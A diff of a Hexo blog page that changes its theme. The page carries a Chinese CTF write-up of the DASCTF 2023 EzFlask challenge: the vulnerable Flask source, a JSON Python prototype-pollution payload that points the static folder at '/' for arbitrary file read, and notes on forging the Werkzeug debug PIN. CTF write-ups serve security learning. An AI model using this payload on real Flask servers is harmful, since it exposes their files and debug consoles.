@@ -1,355 +1,155 @@
+
+
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="123title: DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeupdate: 2023-08-25 00:49:55tags: CTF  DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB WriteupwebEzFlask123456789101112131415161718192021222324252627282930313233343">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="123title: DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeupdate: 2023-08-25 00:49:55tags: CTF  DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB WriteupwebEzFlask123456789101112131415161718192021222324252627282930313233343">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230814001826203.png">
-<meta property="article:published_time" content="2023-08-28T05:11:37.986Z">
-<meta property="article:modified_time" content="2023-08-28T08:11:51.008Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230814001826203.png">
-  
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
-  
-  
-      
-<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
-  
-<link rel="stylesheet" href="/css/style.css">
 
-  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-  
-  
-      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  
-  <!-- 加载特效 -->
-    <script src="/js/pace.js"></script>
-    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
-  <script>
-      var yiliaConfig = {
-          rootUrl: '/',
-          fancybox: true,
-          animate: true,
-          isHome: false,
-          isPost: true,
-          isArchive: false,
-          isTag: false,
-          isCategory: false,
-          open_in_new: false
-      }
-  </script>
+<link rel="canonical" href="http://example.com/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">
+
+
+
+  <title>
+ |
+Yume Shoka = Hexo</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
-<body>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
   <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-        <a href="/" class="profilepic">
-            
-            <img lazy-src="img/head.jpg" class="js-avatar">
-            
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/"></a></h1>
-        </hgroup>
-        
-        
-            <form>
-                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
-            </form>
-            <div id="local-search-result"></div>
-        
-        
-            <script type="text/javascript">
-                (function() {
-                    'use strict';
-                    function getMatchData(keyword, data) {
-                        var matchData = [];
-                        for(var i =0;i<data.length;i++){
-                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
-                                matchData.push(data[i])
-                        }
-                        return matchData;
-                    }
-                    var $input = $('#local-search-input');
-                    var $resultContent = $('#local-search-result');
-                    $input.keyup(function(){
-                        $.ajax({
-                            url: '/search.json',
-                            dataType: "json",
-                            success: function( json ) {
-                                var str='<ul class=\"search-result-list\">';                
-                                var keyword = $input.val().trim().toLowerCase();
-                                $resultContent.innerHTML = "";
-                                if ($input.val().trim().length <= 0) {
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                }
-                                var results = getMatchData(keyword, json);
-                                if(results.length === 0){
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                } 
-                                for(var i =0; i<results.length; i++){
-                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
-                                }
-                                str += "</ul>";
-                                $resultContent.empty();
-                                $resultContent.append(str);
-                                $('#switch-area').hide();
-                            }
-                        });
-                    });
-                })();
-            </script>
-        
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
-                </div>
-            </div>
-        
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a  target="_blank" rel="noopener" href="http://bestwing.me">博客首页</a></li>
-                        
-                            <li><a  href="/archives">文章归档</a></li>
-                        
-                            <li><a  href="/CTFStudy">学习导航</a></li>
-                        
-                            <li><a  href="/PWNABLE">PWNABLE</a></li>
-                        
-                            <li><a  href="/resume">个人简历</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fl mail"  target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
-                            
-                                <a class="fl github"  target="_blank" href="https://github.com/WinMin" title="github">github</a>
-                            
-                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
-                            
-                                <a class="fl weibo"  target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
-                            
-                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a>
-                    </div>
-                </section>
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
-                    
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
-                </section>
-                
-            </div>
-        </div>
-    </header>
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2023-08-28 13:11:37">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-28T13:11:37+08:00">2023-08-28</time>
+  </span>
 </div>
 
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
       </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                
-                    <img lazy-src="/img/head.jpg" class="js-avatar">
-                
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="Me"></a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a target="_blank" rel="noopener" href="http://bestwing.me">博客首页</a></li>
-                
-                    <li><a href="/archives">文章归档</a></li>
-                
-                    <li><a href="/CTFStudy">学习导航</a></li>
-                
-                    <li><a href="/PWNABLE">PWNABLE</a></li>
-                
-                    <li><a href="/resume">个人简历</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                <div class="social">
-                    
-                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
-                    
-                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
-                    
-                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
-                    
-                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
-                    
-                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-                    
-                </div>
-            </nav>
-        </header>                
     </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
 </nav>
-      <div class="body-wrap"><article id="post-DASCTF 2023 &amp; 0X401七月暑期挑战赛" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" class="article-date">
-      <time datetime="2023-08-28T05:11:37.986Z" itemprop="datePublished">2023-08-28</time>
-</a>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclize41wj20zk0m87gk.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
     </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
           
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</span><br><span class="line">date: 2023-08-25 00:49:55</span><br><span class="line">tags: CTF</span><br></pre></td></tr></table></figure>
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</span><br><span class="line">date: 2023-08-25 00:49:55</span><br><span class="line">tags: CTF</span><br></pre></td></tr></table></figure>
 
 <h1 id="DASCTF-2023-0X401七月暑期挑战赛-WEB-Writeup"><a href="#DASCTF-2023-0X401七月暑期挑战赛-WEB-Writeup" class="headerlink" title="DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup"></a>DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
 
@@ -358,7 +158,7 @@
 
 <p>这个函数是一个熟悉的原型链污染函数</p>
 <p>然后没有见过python原型链污染，所以学习开始</p>
-<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8=">https://tttang.com/archive/1876/</span></p>
 <p>然后污染__file__实现任意文件读取</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
 
@@ -377,9 +177,9 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意改为Content-Type: application/json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> : <span class="string">&quot;fuck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> : <span class="string">&quot;you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init_\u005f&quot;</span> :&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">				<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 用/static/xxx下载任意文件</span></span><br></pre></td></tr></table></figure>
 
 <p>然后读取发现处于debug模式想到了写pin码，访问路由console</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230814001826203.png" alt="image-20230814001826203"></p>
+<p><img data-src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230814001826203.png" alt="image-20230814001826203"></p>
 <p>写pin码的exp需要找到对应的版本，网卡地址卡了我半天，然后需要找到对应版本的pin码生成过程</p>
-<p>可以去这个网址看<a target="_blank" rel="noopener" href="https://github.com/pallets/werkzeug/blob/2.0.x/src/werkzeug/debug/__init__.py#L43">https://github.com/pallets/werkzeug/blob/2.0.x/src/werkzeug/debug/__init__.py#L43</a></p>
+<p>可以去这个网址看<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhbGxldHMvd2Vya3pldWcvYmxvYi8yLjAueC9zcmMvd2Vya3pldWcvZGVidWcvX19pbml0X18ucHkjTDQz">https://github.com/pallets/werkzeug/blob/2.0.x/src/werkzeug/debug/__init__.py#L43</span></p>
